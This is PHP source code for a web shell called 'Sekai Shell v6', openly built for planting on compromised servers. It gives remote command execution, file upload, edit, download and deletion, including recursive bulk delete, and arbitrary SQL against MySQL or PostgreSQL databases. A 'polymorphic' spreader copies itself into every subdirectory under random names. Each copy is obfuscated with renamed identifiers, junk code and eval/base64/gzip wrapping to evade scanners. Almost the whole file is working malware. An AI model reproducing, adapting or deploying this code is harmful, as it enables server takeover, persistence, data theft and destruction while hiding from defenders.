<?php
// ========================================================
// Sekai Shell v6 - Polymorphic Obfuscated Spreader
// Usage: http://target.com/shell.php?pass=yourpassword
// ========================================================

// --- Core configuration (will be obfuscated in children) ---
$secret_pass = 'admin';  // CHANGE THIS TO YOUR PASSWORD

session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

// Password protection
if (isset($_POST['pass']) && $_POST['pass'] === $secret_pass) {
    $_SESSION['authenticated'] = true;
    $_SESSION['pass'] = $_POST['pass'];
}
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    die('<form method="POST">Password: <input type="password" name="pass"><input type="submit"></form>');
}

// Persistent working directory
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
} else {
    chdir($_SESSION['cwd']);
}
$self_path = realpath(__FILE__);
if ($self_path === false) {
    $self_path = __FILE__;
}

function find_dir_by_name($base, $name, $max_depth = 5) {
    $queue = [[$base, 0]];
    while ($queue) {
        $current = array_shift($queue);
        $dir = $current[0];
        $depth = $current[1];
        if ($depth > $max_depth) continue;
        $items = @scandir($dir);
        if ($items === false) continue;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                if ($item === $name) return $path;
                if (!is_link($path)) {
                    $queue[] = [$path, $depth + 1];
                }
            }
        }
    }
    return null;
}

// Handle directory change
if (isset($_GET['cd'])) {
    $newdir = $_GET['cd'];
    if (chdir($newdir)) {
        $_SESSION['cwd'] = getcwd();
        header("Location: ?pass=" . urlencode($_SESSION['pass']));
        exit;
    } else {
        $dir_name_only = strpos($newdir, '/') === false && strpos($newdir, '\\') === false;
        if ($dir_name_only && $newdir !== '') {
            $found = find_dir_by_name($_SESSION['cwd'], $newdir, 6);
            if ($found !== null && chdir($found)) {
                $_SESSION['cwd'] = getcwd();
                header("Location: ?pass=" . urlencode($_SESSION['pass']));
                exit;
            }
        }
        $cd_error = "Cannot change to $newdir";
    }
}

// ========================================================
// Real-time command execution (unchanged)
// ========================================================
function realtime_exec($cmd) {
    set_time_limit(0);
    ob_implicit_flush(true);
    ob_end_flush();

    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Pragma: no-cache");
    header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];

    $process = proc_open($cmd, $descriptors, $pipes, $_SESSION['cwd']);
    if (is_resource($process)) {
        fclose($pipes[0]);
        while ($line = fgets($pipes[1])) {
            echo htmlspecialchars($line);
            flush();
        }
        while ($line = fgets($pipes[2])) {
            echo '<span class="error">' . htmlspecialchars($line) . '</span>';
            flush();
        }
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    } else {
        echo "Failed to execute command.";
    }
}

function ini_bytes($val) {
    $val = trim((string)$val);
    if ($val === '') return 0;
    $last = strtolower($val[strlen($val) - 1]);
    $num = (float)$val;
    if ($last === 'g') return (int)($num * 1024 * 1024 * 1024);
    if ($last === 'm') return (int)($num * 1024 * 1024);
    if ($last === 'k') return (int)($num * 1024);
    return (int)$num;
}

// ========================================================
// ADVANCED POLYMORPHIC ENGINE – makes every child unique
// ========================================================

/**
 * Obfuscate a string with a random method
 */
function obfuscate_string($str) {
    $methods = ['base64', 'rot13', 'hex', 'reverse'];
    $m = $methods[array_rand($methods)];
    switch ($m) {
        case 'base64':
            $enc = base64_encode($str);
            return "base64_decode('$enc')";
        case 'rot13':
            $enc = str_rot13($str);
            return "str_rot13('$enc')";
        case 'hex':
            $hex = bin2hex($str);
            return "hex2bin('$hex')";
        case 'reverse':
            $rev = strrev($str);
            return "strrev('$rev')";
    }
}

/**
 * Recursively rename variables inside a function body (simple scope‑aware)
 * This is a simplified version – for real production a tokenizer would be better.
 */
function rename_variables_in_code($code, &$name_map) {
    // Find all $variable names (including $this and static:: are ignored)
    return preg_replace_callback('/\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)/', function($m) use (&$name_map) {
        $var = $m[1];
        // Skip superglobals
        if (in_array($var, ['GLOBALS', '_SERVER', '_GET', '_POST', '_FILES', '_COOKIE', '_SESSION', '_REQUEST', '_ENV'])) {
            return $m[0];
        }
        if (!isset($name_map[$var])) {
            $name_map[$var] = 'v' . bin2hex(random_bytes(4));
        }
        return '$' . $name_map[$var];
    }, $code);
}

/**
 * Generate a heavily obfuscated variant of the original source.
 */
function generate_variant($source) {
    // ------------------------------------------------------------
    // Step 1: Randomly decide to use eval() wrapping for critical parts
    // This makes the code non‑trivial to parse statically.
    // ------------------------------------------------------------
    $use_eval_wrapper = (rand(0, 2) == 0); // 1/3 chance

    // ------------------------------------------------------------
    // Step 2: Isolate the main logic (everything after the opening PHP tag)
    // We'll keep the opening tag and the password check, but heavily obfuscate.
    // ------------------------------------------------------------
    // For simplicity, we treat the whole file as one block.
    // We'll remove the original <?php tag and later add a new one.
    $source = preg_replace('/^<\?php/', '', $source);

    // ------------------------------------------------------------
    // Step 3: Obfuscate all string literals that look like passwords or keys
    // We'll replace literal strings with obfuscated code.
    // ------------------------------------------------------------
    $strings_to_obfuscate = [
        "'adminsekai'", 
        "'authenticated'", 
        "'cwd'", 
        "'pass'",
        "'realtime_exec'",
        "'spread_shell'",
        "'generate_variant'",
        "'db_cfg'",
        "'mysql'",
        "'pgsql'"
    ];
    foreach ($strings_to_obfuscate as $str) {
        // Replace only if the string appears as a literal (not part of a longer string)
        // This is a simple approach – might replace inside comments, but that's fine.
        $obf = obfuscate_string(trim($str, "'"));
        $source = str_replace($str, $obf, $source);
    }

    // ------------------------------------------------------------
    // Step 4: Rename all user functions and variables globally
    // We'll build a map and replace systematically.
    // ------------------------------------------------------------
    $func_map = [];
    $var_map = [];

    // Find all function definitions
    preg_match_all('/function\s+(&?\s*)([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\s*\(/', $source, $func_matches);
    foreach ($func_matches[2] as $fname) {
        if (!isset($func_map[$fname])) {
            $func_map[$fname] = 'f' . bin2hex(random_bytes(4));
        }
    }

    // Rename function calls and definitions
    foreach ($func_map as $old => $new) {
        // Replace function definition
        $source = preg_replace('/function\s+(' . preg_quote($old) . ')\s*\(/', 'function ' . $new . '(', $source);
        // Replace function calls (old_name( -> new_name()
        $source = str_replace($old . '(', $new . '(', $source);
    }

    // Rename variables (careful with superglobals)
    $source = rename_variables_in_code($source, $var_map);

    // ------------------------------------------------------------
    // Step 5: Inject junk code at random positions
    // ------------------------------------------------------------
    $junk_blocks = [
        'if(rand(0,1)){$x=123;$y=456;$z=$x+$y;unset($x,$y,$z);}',
        'for($i=0;$i<rand(1,5);$i++){/* nop */}',
        '$dummy="junk".bin2hex(random_bytes(2));strlen($dummy);',
        'function junk' . rand(100,999) . '(){return false;};',
        '// ' . bin2hex(random_bytes(16)),
        '/* ' . base64_encode(random_bytes(20)) . ' */',
    ];

    // Insert a few junk blocks at random places (after some semicolons)
    $source_parts = explode(';', $source);
    $num_parts = count($source_parts);
    for ($i = 0; $i < rand(3, 7); $i++) {
        $pos = rand(1, $num_parts - 2);
        $junk = $junk_blocks[array_rand($junk_blocks)] . ';';
        array_splice($source_parts, $pos, 0, $junk);
        $num_parts++;
    }
    $source = implode(';', $source_parts);

    // ------------------------------------------------------------
    // Step 6: Randomize whitespace and add misleading formatting
    // ------------------------------------------------------------
    $source = preg_replace('/ {2,}/', str_repeat(' ', rand(1, 4)), $source);
    if (rand(0,1)) {
        $source = str_replace("\t", '    ', $source);
    } else {
        $source = preg_replace('/^    /m', "\t", $source);
    }
    // Add random blank lines
    $source = preg_replace('/\n/', "\n" . str_repeat("\n", rand(0, 2)), $source);

    // ------------------------------------------------------------
    // Step 7: Optionally wrap the whole code in an eval with base64
    // This makes the file look like a tiny loader, hiding the real code.
    // ------------------------------------------------------------
    if ($use_eval_wrapper) {
        $encoded = base64_encode(gzcompress($source, 9));
        $source = '<?php' . "\n" . 'eval(gzuncompress(base64_decode("' . $encoded . '")));';
    } else {
        $source = '<?php' . "\n" . $source;
    }

    return $source;
}

// ========================================================
// Enhanced spreader – uses the polymorphic engine
// ========================================================
function spread_shell($recursive = false, $target_dir = null) {
    $source = __FILE__;
    $current_dir = $target_dir ?: $_SESSION['cwd'];
    $results = [];

    $original_code = file_get_contents($source);
    if ($original_code === false) {
        return ["❌ Failed to read source file."];
    }

    $items = scandir($current_dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full_path)) {
            // Generate random filename (8-20 alphanumeric)
            $length = rand(8, 20);
            $random_name = '';
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            $max = strlen($chars) - 1;
            for ($i = 0; $i < $length; $i++) {
                $random_name .= $chars[rand(0, $max)];
            }
            $random_name .= '.php';

            $target_file = $full_path . DIRECTORY_SEPARATOR . $random_name;

            // Generate a UNIQUE heavily obfuscated variant
            $variant_code = generate_variant($original_code);

            if (file_put_contents($target_file, $variant_code) !== false) {
                $results[] = "✅ Created: " . htmlspecialchars($target_file) . " (polymorphic)";
            } else {
                $results[] = "❌ Failed: " . htmlspecialchars($target_file);
            }

            if ($recursive) {
                $results = array_merge($results, spread_shell(true, $full_path));
            }
        }
    }
    return $results;
}
// ========================================================
// Handle actions
// ========================================================
$output = '';
$action_result = '';
$editor_html = '';
$db_msg = '';
$db_result_html = '';
$db_tables = [];
$db_connected = false;
$db_cfg = isset($_SESSION['db_cfg']) ? $_SESSION['db_cfg'] : null;
$max_upload = ini_get('upload_max_filesize');
$max_post = ini_get('post_max_size');
$max_upload_bytes = ini_bytes($max_upload);
$max_post_bytes = ini_bytes($max_post);
$effective_upload_bytes = 0;
if ($max_upload_bytes > 0 && $max_post_bytes > 0) {
    $effective_upload_bytes = min($max_upload_bytes, $max_post_bytes);
} elseif ($max_upload_bytes > 0) {
    $effective_upload_bytes = $max_upload_bytes;
} elseif ($max_post_bytes > 0) {
    $effective_upload_bytes = $max_post_bytes;
}
$request_too_large_msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $content_length = isset($_SERVER['CONTENT_LENGTH']) ? (int)$_SERVER['CONTENT_LENGTH'] : 0;
    if ($max_post_bytes > 0 && $content_length > $max_post_bytes) {
        $request_too_large_msg = "<p class='error'>❌ Request too large. post_max_size={$max_post}.</p>";
    }
}

// Command execution
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (isset($_POST['realtime']) && $_POST['realtime'] == '1') {
        // realtime_exec() already sends headers, but we need to ensure no extra output before it
        realtime_exec($cmd);
        exit;
    } else {
        $output = "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
    }
}

// File upload
if (isset($_FILES['upload'])) {
    if ($request_too_large_msg !== '') {
        $action_result = $request_too_large_msg;
    } else {
        $file = $_FILES['upload'];
        $error = isset($file['error']) ? $file['error'] : UPLOAD_ERR_NO_FILE;
        if ($error !== UPLOAD_ERR_OK) {
            $err_map = [
                UPLOAD_ERR_INI_SIZE => "File exceeds upload_max_filesize ({$max_upload}).",
                UPLOAD_ERR_FORM_SIZE => "File exceeds MAX_FILE_SIZE.",
                UPLOAD_ERR_PARTIAL => "File only partially uploaded.",
                UPLOAD_ERR_NO_FILE => "No file uploaded.",
                UPLOAD_ERR_NO_TMP_DIR => "Missing temporary folder.",
                UPLOAD_ERR_CANT_WRITE => "Failed to write file to disk.",
                UPLOAD_ERR_EXTENSION => "Upload stopped by extension.",
            ];
            $msg = isset($err_map[$error]) ? $err_map[$error] : "Upload error.";
            $action_result = "<p class='error'>❌ {$msg}</p>";
        } else {
            $orig = basename($file['name']);
            $diru = $_SESSION['cwd'];
            if (!is_dir($diru) || !is_writable($diru)) {
                $action_result = "<p class='error'>❌ Upload failed. Target directory not writable.</p>";
            } elseif (!is_uploaded_file($file['tmp_name'])) {
                $action_result = "<p class='error'>❌ Upload failed. Temporary upload not found.</p>";
            } elseif (isset($file['size']) && (int)$file['size'] === 0) {
                $action_result = "<p class='error'>❌ Upload failed. File size is 0 bytes.</p>";
            } else {
                $rename = isset($_POST['upload_name']) ? trim($_POST['upload_name']) : '';
                $final = $orig;
                if ($rename !== '') {
                    $rename = str_replace(["\\", "/", "\0"], '', $rename);
                    $rename = trim($rename);
                    $rename = basename($rename);
                    if ($rename !== '') {
                        $final = $rename;
                        if (strpos($final, '.') === false) {
                            $ext = pathinfo($orig, PATHINFO_EXTENSION);
                            if ($ext !== '') $final .= '.' . $ext;
                        }
                    }
                }
                $final = preg_replace('/[^\w.\- ]+/u', '_', $final);
                $target = $diru . DIRECTORY_SEPARATOR . $final;
                if (file_exists($target)) {
                    $n = pathinfo($final, PATHINFO_FILENAME);
                    $e = pathinfo($final, PATHINFO_EXTENSION);
                    $i = 1;
                    do {
                        $cand = $n . '-' . $i . ($e !== '' ? '.' . $e : '');
                        $target = $diru . DIRECTORY_SEPARATOR . $cand;
                        $i++;
                    } while (file_exists($target) && $i < 1000);
                }
                if (move_uploaded_file($file['tmp_name'], $target)) {
                    $action_result = "<p class='success'>✅ Uploaded: " . htmlspecialchars(basename($target)) . "</p>";
                } else {
                    $action_result = "<p class='error'>❌ Upload failed.</p>";
                }
            }
        }
    }
}

// File download
if (isset($_GET['download'])) {
    $file = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// File delete
if (isset($_GET['delete'])) {
    $file = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (file_exists($file) && is_file($file)) {
        if (unlink($file)) {
            $action_result = "<p class='success'>✅ Deleted: " . htmlspecialchars($_GET['delete']) . "</p>";
        } else {
            $action_result = "<p class='error'>❌ Delete failed.</p>";
        }
    }
}

if (isset($_POST['file_name']) && isset($_POST['file_content'])) {
    $file = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $_POST['file_name'];
    if (file_exists($file) && is_file($file)) {
        if (file_put_contents($file, $_POST['file_content']) !== false) {
            $action_result = "<p class='success'>✅ Saved: " . htmlspecialchars($_POST['file_name']) . "</p>";
        } else {
            $action_result = "<p class='error'>❌ Save failed.</p>";
        }
    } else {
        $action_result = "<p class='error'>❌ File not found.</p>";
    }
}

if (isset($_POST['new_file_create']) && isset($_POST['new_file_name'])) {
    $name = trim($_POST['new_file_name']);
    $name = str_replace(["\\", "/", "\0"], '', $name);
    $name = basename($name);
    $name = preg_replace('/[^\w.\- ]+/u', '_', $name);
    if ($name === '' || $name === '.' || $name === '..') {
        $action_result = "<p class='error'>❌ Nama file tidak valid.</p>";
    } else {
        $base = $name;
        $target = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $base;
        if (file_exists($target)) {
            $n = pathinfo($base, PATHINFO_FILENAME);
            $e = pathinfo($base, PATHINFO_EXTENSION);
            $i = 1;
            do {
                $cand = $n . '-' . $i . ($e !== '' ? '.' . $e : '');
                $target = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $cand;
                $i++;
            } while (file_exists($target) && $i < 1000);
        }
        $content = isset($_POST['new_file_content']) ? $_POST['new_file_content'] : '';
        if (file_put_contents($target, $content) !== false) {
            $created = basename($target);
            header("Location: ?pass=" . urlencode($_SESSION['pass']) . "&edit=" . urlencode($created));
            exit;
        } else {
            $action_result = "<p class='error'>❌ Gagal membuat file.</p>";
        }
    }
}

if (isset($_GET['view']) || isset($_GET['edit'])) {
    $target_name = isset($_GET['view']) ? $_GET['view'] : $_GET['edit'];
    $file = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target_name;
    if (file_exists($file) && is_file($file)) {
        $content = file_get_contents($file);
        if ($content === false) {
            $editor_html = "<p class='error'>❌ Failed to read file.</p>";
        } else {
            $readonly = isset($_GET['view']) ? 'readonly' : '';
            $button = isset($_GET['view']) ? '' : "<input type=\"submit\" name=\"save_file\" value=\"Save\">";
            $escaped = htmlspecialchars($content);
            $editor_html = "<div class=\"box editor-box\"><h3>📝 " . (isset($_GET['view']) ? "View" : "Edit") . " File</h3><form method=\"post\"><input type=\"hidden\" name=\"file_name\" value=\"" . htmlspecialchars($target_name) . "\"><div class=\"editor-grid\"><div class=\"code-pane\"><div class=\"pane-title\">Preview</div><pre id=\"code_preview\" class=\"code-view\">" . $escaped . "</pre></div><div class=\"code-pane\"><div class=\"pane-title\">Editor</div><textarea id=\"code_editor\" name=\"file_content\" class=\"code-editor\" rows=\"24\" $readonly>" . $escaped . "</textarea></div></div><div class=\"editor-actions\">$button</div></form><script>var e=document.getElementById('code_editor');var p=document.getElementById('code_preview');if(e&&p){e.addEventListener('input',function(){p.textContent=e.value;});}</script></div>";
        }
    } else {
        $editor_html = "<p class='error'>❌ File not found.</p>";
    }
}

// Bulk delete
function rrmdir_sekai($dir) {
    if (is_link($dir)) { return @unlink($dir); }
    if (!is_dir($dir)) { return @unlink($dir); }
    $items = scandir($dir);
    foreach ($items as $i) {
        if ($i === '.' || $i === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $i;
        if (is_dir($path) && !is_link($path)) {
            rrmdir_sekai($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

if (isset($_POST['bulk_delete']) && isset($_POST['sel']) && is_array($_POST['sel'])) {
    $cwd_bulk = $_SESSION['cwd'];
    $allowed = array_flip(array_diff(scandir($cwd_bulk), ['.','..']));
    $log = [];
    foreach ($_POST['sel'] as $name) {
        $name = (string)$name;
        if ($name === '' || strpos($name, DIRECTORY_SEPARATOR) !== false || $name === '.' || $name === '..') {
            $log[] = "❌ Skip: " . htmlspecialchars($name) . " (invalid)";
            continue;
        }
        if (!isset($allowed[$name])) {
            $log[] = "❌ Skip: " . htmlspecialchars($name) . " (not in current dir)";
            continue;
        }
        $target = $cwd_bulk . DIRECTORY_SEPARATOR . $name;
        if (is_dir($target)) {
            $ok = rrmdir_sekai($target);
            $log[] = ($ok ? "✅" : "❌") . " Dir: " . htmlspecialchars($name);
        } else {
            $ok = @unlink($target);
            $log[] = ($ok ? "✅" : "❌") . " File: " . htmlspecialchars($name);
        }
    }
    $action_result .= "<div class='box'><h3>🧹 Bulk Delete</h3><pre>" . implode("\n", $log) . "</pre></div>";
}

// Spread action
if (isset($_POST['spread'])) {
    $recursive = isset($_POST['recursive']) ? true : false;
    $results = spread_shell($recursive);
    $action_result = "<h3>Spreader Results</h3><pre>" . implode("\n", $results) . "</pre>";
}

if ($action_result === '' && $request_too_large_msg !== '') {
    $action_result = $request_too_large_msg;
}

if (isset($_POST['db_disconnect'])) {
    unset($_SESSION['db_cfg']);
    $db_cfg = null;
    $db_msg = "<p>Terputus dari database</p>";
}

if (isset($_POST['db_connect'])) {
    $driver = isset($_POST['db_driver']) ? $_POST['db_driver'] : 'mysql';
    $host = isset($_POST['db_host']) ? trim($_POST['db_host']) : '127.0.0.1';
    $port = isset($_POST['db_port']) ? trim($_POST['db_port']) : '';
    $name = isset($_POST['db_name']) ? trim($_POST['db_name']) : '';
    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
    $dsn = '';
    if ($driver === 'mysql') {
        $p = $port !== '' ? $port : '3306';
        $dsn = "mysql:host=".$host.";port=".$p.";dbname=".$name;
    } elseif ($driver === 'pgsql') {
        $p = $port !== '' ? $port : '5432';
        $dsn = "pgsql:host=".$host.";port=".$p.";dbname=".$name;
    }
    try {
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]);
        $_SESSION['db_cfg'] = ['driver'=>$driver,'host'=>$host,'port'=>$port,'name'=>$name,'user'=>$user,'pass'=>$pass];
        $db_cfg = $_SESSION['db_cfg'];
        $db_connected = true;
        $db_msg = "<p class='success'>Terhubung ke ".$driver." @ ".$host.($port!==''?":".$port:"")." / ".$name."</p>";
    } catch (Exception $e) {
        $db_msg = "<p class='error'>Gagal koneksi: ".htmlspecialchars($e->getMessage())."</p>";
    }
}

function db_make_pdo($cfg) {
    if (!$cfg) return null;
    $driver = $cfg['driver'];
    $host = $cfg['host'];
    $port = $cfg['port'];
    $name = $cfg['name'];
    $user = $cfg['user'];
    $pass = $cfg['pass'];
    $dsn = '';
    if ($driver === 'mysql') {
        $p = $port !== '' ? $port : '3306';
        $dsn = "mysql:host=".$host.";port=".$p.";dbname=".$name;
    } elseif ($driver === 'pgsql') {
        $p = $port !== '' ? $port : '5432';
        $dsn = "pgsql:host=".$host.";port=".$p.";dbname=".$name;
    } else {
        return null;
    }
    try {
        return new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]);
    } catch (Exception $e) {
        return null;
    }
}

if ($db_cfg && !$db_connected) {
    $pdo = db_make_pdo($db_cfg);
    if ($pdo) $db_connected = true;
}

if ($db_connected) {
    if (!isset($pdo)) $pdo = db_make_pdo($db_cfg);
    try {
        if ($db_cfg['driver'] === 'mysql') {
            $stmt = $pdo->query("SHOW TABLES");
            $db_tables = $stmt ? $stmt->fetchAll(PDO::FETCH_NUM) : [];
            $db_tables = array_map(function($r){return $r[0];}, $db_tables);
        } else {
            $stmt = $pdo->query("SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')");
            $rows = $stmt ? $stmt->fetchAll(PDO::FETCH_ASSOC) : [];
            $db_tables = array_map(function($r){return $r['tablename'];}, $rows);
        }
    } catch (Exception $e) {
        $db_msg .= "<p class='error'>Gagal ambil tabel: ".htmlspecialchars($e->getMessage())."</p>";
    }
    $db_limit = isset($_GET['db_limit']) ? max(1, min(1000, intval($_GET['db_limit']))) : 50;
    if (isset($_GET['db_table'])) {
        $t = $_GET['db_table'];
        try {
            if ($db_cfg['driver'] === 'mysql') {
                $q = "SELECT * FROM `".$t."` LIMIT ".$db_limit;
            } else {
                $q = 'SELECT * FROM "'.$t.'" LIMIT '.$db_limit;
            }
            $st = $pdo->query($q);
            if ($st) {
                $rows = $st->fetchAll(PDO::FETCH_ASSOC);
                if (count($rows) > 0) {
                    $cols = array_keys($rows[0]);
                    $html = "<div class='box'><h3>Data: ".htmlspecialchars($t)." (".$db_limit." baris)</h3><div class='table-scroll'><table><tr>";
                    foreach ($cols as $c) { $html .= "<th>".htmlspecialchars($c)."</th>"; }
                    $html .= "</tr>";
                    foreach ($rows as $r) {
                        $html .= "<tr>";
                        foreach ($cols as $c) {
                            $val = isset($r[$c]) ? $r[$c] : null;
                            $html .= "<td>".htmlspecialchars((string)$val)."</td>";
                        }
                        $html .= "</tr>";
                    }
                    $html .= "</table></div></div>";
                    $db_result_html = $html;
                } else {
                    $db_result_html = "<div class='box'><p>Tabel kosong</p></div>";
                }
            }
        } catch (Exception $e) {
            $db_result_html = "<div class='box'><p class='error'>Error: ".htmlspecialchars($e->getMessage())."</p></div>";
        }
    }
    if (isset($_POST['db_run_sql']) && isset($_POST['db_sql'])) {
        $sql = trim($_POST['db_sql']);
        if ($sql !== '') {
            try {
                $st = $pdo->query($sql);
                if ($st instanceof PDOStatement) {
                    $rows = $st->fetchAll(PDO::FETCH_ASSOC);
                    if (count($rows) > 0) {
                        $cols = array_keys($rows[0]);
                        $html = "<div class='box'><h3>Hasil Query</h3><div class='table-scroll'><table><tr>";
                        foreach ($cols as $c) { $html .= "<th>".htmlspecialchars($c)."</th>"; }
                        $html .= "</tr>";
                        foreach ($rows as $r) {
                            $html .= "<tr>";
                            foreach ($cols as $c) {
                                $val = isset($r[$c]) ? $r[$c] : null;
                                $html .= "<td>".htmlspecialchars((string)$val)."</td>";
                            }
                            $html .= "</tr>";
                        }
                        $html .= "</table></div></div>";
                        $db_result_html = $html;
                    } else {
                        $db_result_html = "<div class='box'><p>Tidak ada baris.</p></div>";
                    }
                } else {
                    $db_result_html = "<div class='box'><p>Query dieksekusi.</p></div>";
                }
            } catch (Exception $e) {
                $db_result_html = "<div class='box'><p class='error'>Error: ".htmlspecialchars($e->getMessage())."</p></div>";
            }
        }
    }
}

// Get current directory listing
$cwd = $_SESSION['cwd'];
$files = scandir($cwd);
$breadcrumbs_html = '';
$pass_q = isset($_SESSION['pass']) ? urlencode($_SESSION['pass']) : '';
$parts = preg_split('/[\/\\\\]+/', $cwd, -1, PREG_SPLIT_NO_EMPTY);
$crumbs = [];
if (preg_match('/^[A-Za-z]:[\/\\\\]/', $cwd)) {
    $root = substr($cwd, 0, 2) . DIRECTORY_SEPARATOR;
    $crumbs[] = '<a href="?pass='.$pass_q.'&cd='.urlencode($root).'">'.htmlspecialchars(substr($cwd, 0, 2)).'</a>';
} else {
    $root = DIRECTORY_SEPARATOR;
    $crumbs[] = '<a href="?pass='.$pass_q.'&cd='.urlencode($root).'">'.htmlspecialchars(DIRECTORY_SEPARATOR).'</a>';
}
$acc = [];
for ($i = 0; $i < count($parts); $i++) {
    $acc[] = $parts[$i];
    $acc_path = $root . implode(DIRECTORY_SEPARATOR, $acc);
    $label = htmlspecialchars($parts[$i]);
    if ($i < count($parts) - 1) {
        $crumbs[] = '<a href="?pass='.$pass_q.'&cd='.urlencode($acc_path).'">'.$label.'</a>';
    } else {
        $crumbs[] = '<span>'.$label.'</span>';
    }
}
$breadcrumbs_html = implode(' <span class="sep">/</span> ', $crumbs);
$dir_datalist = '';
foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $full = $cwd . DIRECTORY_SEPARATOR . $f;
    if (is_dir($full)) {
        $dir_datalist .= '<option value="'.htmlspecialchars($full).'">';
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sekai shell v6 - Infinite Variants Spreader</title>
    <style>
        body { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background: #0f0f10; color: #e8e8e8; margin: 20px; }
        input, textarea, select, button { background: #161719; color: #e8e8e8; border: 1px solid #2d2f33; padding: 8px; border-radius: 6px; }
        button, input[type=submit] { cursor: pointer; }
        a { color: #d8d8d8; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { border-collapse: collapse; width: 100%; }
        td, th { border: 1px solid #26282c; padding: 8px; text-align: left; }
        th { background: #1b1c1f; color: #e8e8e8; }
        .error { color: #d0d0d0; }
        .success { color: #e0e0e0; }
        .box { border: 1px solid #26282c; padding: 14px; margin: 12px 0; border-radius: 8px; background: #121314; }
        .layout-row { display: grid; grid-template-columns: minmax(320px, 1fr) minmax(420px, 1fr); gap: 12px; align-items: start; }
        .layout-col { min-width: 0; }
        .file-list .box { max-height: 72vh; overflow: auto; position: relative; }
        .file-list table { table-layout: fixed; }
        .file-list td { word-break: break-all; }
        .file-list table tr:hover td { background: #161718; }
        .name-cell { display: flex; align-items: center; gap: 8px; }
        .name-cell .icon { width: 1.2em; display: inline-flex; justify-content: center; }
        .actions { white-space: nowrap; }
        .actions a { text-decoration: underline; margin-right: 12px; color: #e8e8e8; }
        .actions a:hover { color: #ffffff; }
        .actions a.danger:hover { color: #f0f0f0; }
        .actions a:last-child { margin-right: 0; }
        .sel-col { width: 44px; text-align: center; }
        .db-form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; align-items: end; }
        .upload-grid { display: grid; grid-template-columns: 1fr 1fr auto; gap: 8px; align-items: center; }
        .breadcrumbs { margin: 6px 0 10px; overflow: auto; white-space: nowrap; }
        .breadcrumbs a { text-decoration: underline; }
        .breadcrumbs .sep { margin: 0 6px; opacity: .6; }
        .editor-col .box { max-height: 72vh; overflow: auto; position: relative; z-index: 1; }
        .editor-box { position: sticky; top: 10px; }
        .editor-grid { display: flex; gap: 12px; align-items: stretch; }
        .code-pane { flex: 1; min-width: 0; }
        .pane-title { margin-bottom: 6px; font-weight: 700; }
        .code-view { background: #141516; color: #e6e6e6; border: 1px solid #2d2f33; padding: 10px; height: clamp(220px, 32vh, 520px); overflow: auto; white-space: pre; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
        .code-editor { width: 100%; height: clamp(220px, 32vh, 520px); resize: vertical; background: #121314; color: #e8e8e8; border: 1px solid #2d2f33; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
        .editor-actions { margin-top: 10px; }
        .db-grid { display: grid; grid-template-columns: 1.3fr 1fr; gap: 12px; align-items: start; }
        .table-scroll { overflow: auto; max-height: 50vh; }
        @media (max-width: 1200px) { .layout-row { grid-template-columns: 1fr; } }
        @media (max-width: 1000px) { .db-grid { grid-template-columns: 1fr; } }
    </style>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
</head>
<body>
<h2>Sekai Shell v5</h2>

<!-- Current directory & error display -->
<p><strong>Current directory:</strong> <?php echo htmlspecialchars($cwd); ?></p>
<p><strong>Shell file:</strong> <?php echo htmlspecialchars($self_path); ?></p>
<div class="breadcrumbs"><?php echo $breadcrumbs_html; ?></div>
